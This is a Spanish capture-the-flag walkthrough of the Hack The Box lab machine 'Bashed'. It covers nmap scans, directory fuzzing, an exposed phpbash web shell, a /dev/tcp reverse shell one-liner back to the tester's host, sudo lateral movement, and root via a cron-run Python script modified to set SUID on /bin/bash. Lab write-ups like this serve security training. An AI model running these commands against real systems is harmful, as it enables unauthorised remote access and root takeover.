---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Bashed

`Bashed` es una máquina bastante sencilla que se centra principalmente en realizar pruebas de fuzzing y localizar archivos importantes. Como el acceso básico al crontab está restringido,

<figure><img src="../../.gitbook/assets/Bashed.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Bashed**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.68 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 23:45 CET
Initiating SYN Stealth Scan at 23:45
Scanning 10.10.10.68 [65535 ports]
Discovered open port 80/tcp on 10.10.10.68
Completed SYN Stealth Scan at 23:45, 26.40s elapsed (65535 total ports)
Nmap scan report for 10.10.10.68
Host is up, received user-set (0.066s latency).
Scanned at 2025-01-26 23:45:07 CET for 26s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.57 seconds
           Raw packets sent: 67203 (2.957MB) | Rcvd: 68310 (2.955MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.68
	[*] Open ports: 80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Apache`.

```bash
❯ nmap -sCV -p80 10.10.10.68 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-26 23:46 CET
Nmap scan report for 10.10.10.68
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel''s Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4, Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   89.52 ms 10.10.16.1
2   31.24 ms 10.10.10.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

Realizaremos una comprobación de las tecnologías que son utilizadas en el sitio web.

```bash
❯ whatweb http://10.10.10.68
http://10.10.10.68 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.68], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel's Development Site]
```

Accederemos a [http://10.10.10.68](http://10.10.10.68) y verificaremos el siguiente contenido. Verificamos que hay un apartado en donde mencionan algo de `phpbash`.

<figure><img src="../../.gitbook/assets/imagen (19) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Initial Access

### Abusing phpbash interactive shell on the website

Al acceder al apartado en donde mencionaban `phpbash`, comprobamos que se trata de la herramienta `phpbash`.

{% hint style="info" %}
**phpbash** es una herramienta creada para facilitar la ejecución de comandos en servidores web vulnerables. Básicamente, es una **web shell interactiva** escrita en PHP que simula una interfaz de terminal directamente en el navegador. Es como tener un acceso remoto (tipo bash) al servidor a través de una página web.
{% endhint %}

{% embed url="https://github.com/Arrexel/phpbash" %}

<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Realizaremos **fuzzing** en busca de directorios en el sitio web. Nos encontramos con un directorio algo inusual. Revisaremos el directorio llamado `/dev/`.

```bash
❯ dirsearch -u 'http://10.10.10.68' -i 200 -t 100 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Bashed/Bashed/reports/http_10.10.10.68/_25-01-26_23-50-30.txt

Target: http://10.10.10.68/

[23:50:30] Starting: 
[23:50:49] 200 -    2KB - /about.html
[23:51:25] 200 -    0B  - /config.php
[23:51:27] 200 -    2KB - /contact.html
[23:51:32] 200 -  479B  - /dev/
[23:51:46] 200 -  513B  - /images/
[23:51:52] 200 -  660B  - /js/
[23:52:16] 200 -  454B  - /php/
[23:52:52] 200 -   14B  - /uploads/

Task Completed
```

Accediendo a este nuevo directorio encontrado, podemos observar que hay dos archivos `PHP`. Accederemos al archivo nombrado `phpbash.php`.

<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al acceder al archivo, verificamos que se trata de la herramienta de `phpbash` y podemos ejecutar comandos en el equipo víctima.

<figure><img src="../../.gitbook/assets/imagen (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo tanto, nos otorgaremos una Reverse Shell para tener una consola más interactiva. Para ello, nos pondremos en escucha para recibir la conexión.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Desde la herramienta de `phpbash` enviaremos la Reverse Shell hacía nuestro equipo atacante.

```bash
bash -c 'bash -i >%26 /dev/tcp/10.10.16.5/443 0>%261'
```

Verificaremos que hemos logrado obtener acceso al equipo y podemos visualizar la flag de user.tx&#x74;**.**

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.68] 54870
bash: cannot set terminal process group (839): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bashed:/var/www/html/dev$ ls -l /home/
total 8
drwxr-xr-x 4 arrexel       arrexel       4096 Jun  2  2022 arrexel
drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec  4  2017 scriptmanager
www-data@bashed:/var/www/html/dev$ cat /home/arrexel/user.txt
903ab6952c1d********************
```

## Privilege Escalation

### Lateral Movement to Scriptmanager via sudo NOPASSWD

Revisando los permisos que dispone el usuario `www-data`, nos encontramos que puede ejecutar como `sudo` cualquier comando como usuario `scriptmanager`.

```bash
www-data@bashed:/var/www/html/dev$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL

www-data@bashed:/var/www/html/dev$ sudo su scriptmanager /bin/bash
scriptmanager@bashed:/var/www/html/dev$
```

### Abuse of Python Script in Scheduled Task

Revisando los directorios de la raíz `/` nos encontamos que a través de este usuario actual somos los propietarios de un directorio llamado `scripts`.

```bash
scriptmanager@bashed:/$ ls -l
total 80
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 Jan 26 14:42 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 177 root          root              0 Jan 26 14:41 proc
drwx------   3 root          root           4096 Jan 26 14:43 root
drwxr-xr-x  18 root          root            500 Jan 26 14:42 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
```

Accediendo al directorio, nos encontramos con un archivo llamado `test.py` que abre el archivo llamado `test.txt` y escribe en él el texto `testing 123!`.

También comprobamos que el propietario del archivo `test.py` es el usuario que disponemos actualmente, y el archivo que genera el script es el usuario`root`.

Por lo cual, podemos deducir que debe existir una tarea programada (cron) que ejecute el usuario `root` sobre el script mencionado. Por lo tanto, teniendo permisos de editar este archivo, podríamos modificarlo para que realizara las acciones que deseemos.

```bash
scriptmanager@bashed:/scripts$ ls -l 
total 8
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root          12 Jan 26 14:59 test.txt
scriptmanager@bashed:/scripts$ cat test.py 
f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ cat test.txt 
testing 123!
```

Revisaremos primeramente que el binario de `/bin/bash` no se encuentre con permisos de SUID.

```bash
scriptmanager@bashed:/scripts$ find / -perm -4000 2>/dev/null
/bin/mount
/bin/fusermount
/bin/su
/bin/umount
/bin/ping6
```

Editaremos el archivo mencionado y le indicaremos que ejecute las siguientes instrucciones. Lo que realizará es dar permisos de `SUID`al binario.

```bash
scriptmanager@bashed:/scripts$ cat test.py
import os

os.system("chmod u+s /bin/bash")
```

Revisaremos que se han asignado correctamente los permisos indicados.

```bash
scriptmanager@bashed:/scripts$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
```

Abusaremos de estos permisos y nos convertiremos en el propietario del binario y comprobamos que somos actualmente el usuario `root`. Visualizamos la flag de **root.txt**.

```bash
scriptmanager@bashed:/scripts$ bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt
47e69ba25e4e8e*******************
```
